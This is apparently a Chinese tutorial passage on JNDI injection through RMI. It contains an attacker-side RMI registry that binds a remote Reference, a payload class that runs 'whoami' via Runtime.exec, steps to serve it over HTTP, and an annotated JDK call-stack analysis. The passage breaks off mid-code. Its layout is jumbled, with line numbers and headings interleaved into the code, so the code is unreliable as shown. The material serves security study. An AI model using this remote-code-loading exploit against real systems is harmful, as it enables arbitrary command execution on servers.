        Context ctx = new InitialContext();
10
        ctx.lookup(uri);
11
12
    }
13
14
}
15
package jndi注入;
1
2
import com.sun.jndi.rmi.registry.ReferenceWrapper;
3
import javax.naming.Reference;
4
ExecTest.java(攻击者部署)
import java.rmi.registry.Registry;
5
import java.rmi.registry.LocateRegistry;
6
7
public class SERVER {
8
9
    public static void main(String args[]) throws Exception {
10
11
        Registry registry = LocateRegistry.createRegistry(1099);
12
        Reference aa = new Reference("ExecTest", "ExecTest", 
"http://127.0.0.1:8081/");
13
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
14
        System.out.println("Binding 'refObjWrapper' to 
'rmi://127.0.0.1:1099/aa'");
15
        registry.bind("aa", refObjWrapper);
16
17
    }
18
19
}
20
import java.io.BufferedReader;
1
import java.io.IOException;
2
import java.io.InputStream;
3
import java.io.InputStreamReader;
4
import java.io.Reader;
5
import javax.print.attribute.standard.PrinterMessageFromOperator;
6
public class ExecTest {
7
    public ExecTest() throws IOException,InterruptedException{
8
        String cmd="whoami";
9
        final Process process = Runtime.getRuntime().exec(cmd);
10
        printMessage(process.getInputStream());;
11
        printMessage(process.getErrorStream());
12
        int value=process.waitFor();
13
        System.out.println(value);
14
    }
15
16
    private static void printMessage(final InputStream input) {
17
        // TODO Auto-generated method stub
18
        new Thread (new Runnable() {
19
            @Override
20
            public void run() {
21
                // TODO Auto-generated method stub
22
                Reader reader =new InputStreamReader(input);
23
                BufferedReader bf = new BufferedReader(reader);
24
                String line = null;
25
                try {
26
                    while ((line=bf.readLine())!=null)
27
                    {
28
                        System.out.println(line);
29
编译成class⽂件：javac ExecTest.java
部署在web服务上：py -3 -m http.server 8081
运⾏SERVER
运⾏CLIENT
整体调⽤栈如下：
InitialContext.java
                    }
30
                }catch (IOException  e){
31
                    e.printStackTrace();
32
                }
33
            }
34
        }).start();
35
    }
36
}
37
public Object lookup(String name) throws NamingException {
1
        //getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，
此处返回Context对象的子类rmiURLContext对象
2
RegistryContext.java：
        //然后在对应协议中去lookup搜索，我们进入lookup函数
3
        return getURLOrDefaultInitCtx(name).lookup(name);
4
    }
5
GenericURLContext.java
6
//var1="rmi://127.0.0.1:1099/aa"
7
public Object lookup(String var1) throws NamingException {
8
    //此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址
9
    //不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不
同，执行不同的getRootURLContext
10
    //进入不同的协议路线
11
    ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);//获取
RMI注册中心相关数据
12
    Context var3 = (Context)var2.getResolvedObj();//获取注册中心对象
13
14
    Object var4;
15
    try {
16
        var4 = var3.lookup(var2.getRemainingName());//去注册中心调用lookup查
找，我们进入此处，传入name-aa
17
    } finally {
18
        var3.close();
19
    }
20
21
    return var4;
22
}
23
//传入var1=aa
1
public Object lookup(Name var1) throws NamingException {
2
    if (var1.isEmpty()) {
3
        return new RegistryContext(this);
4
    } else {//判断来到这里
5
        Remote var2;
6
        try {
7
            var2 = this.registry.lookup(var1.get(0));//RMI客户端与注册中心通
讯，返回RMI服务IP，地址等信息
8
        } catch (NotBoundException var4) {
9
            throw new NameNotFoundException(var1.get(0));
10
        } catch (RemoteException var5) {
11
            throw 
(NamingException)wrapRemoteException(var5).fillInStackTrace();
12
        }
13
14
        return this.decodeObject(var2, var1.getPrefix(1));//我们进入此处
15
RegistryContext.java：
    }
16
}
17
private Object decodeObject(Remote var1, Name var2) throws NamingException 
{
1
        try {
2
            //注意到上面的服务端代码，我们在RMI服务端绑定的是一个Reference对象，
世界线在这里变动
3
            //如果是Reference对象会，进入var.getReference()，与RMI服务器进行一
次连接，获取到远程class文件地址。
4
            //如果是普通RMI对象服务，这里不会进行连接，只有在正式远程函数调用的时
候才会连接RMI服务。
5
            Object var3 = var1 instanceof RemoteReference ? 
((RemoteReference)var1).getReference() : var1;
6
            return NamingManager.getObjectInstance(var3, var2, this, 
this.environment);
7
            //获取reference对象进入此处
8
        } catch (NamingException var5) {
9
            throw var5;
10
        } catch (RemoteException var6) {
11
            throw 
(NamingException)wrapRemoteException(var6).fillInStackTrace();
12
        } catch (Exception var7) {
13
            NamingException var4 = new NamingException();
14
            var4.setRootCause(var7);
15
            throw var4;
16
        }
17
    }
18
}
19
NamingManager.java 截取部分有⽤的代码
//传入Reference对象到refinfo
1
public static Object
2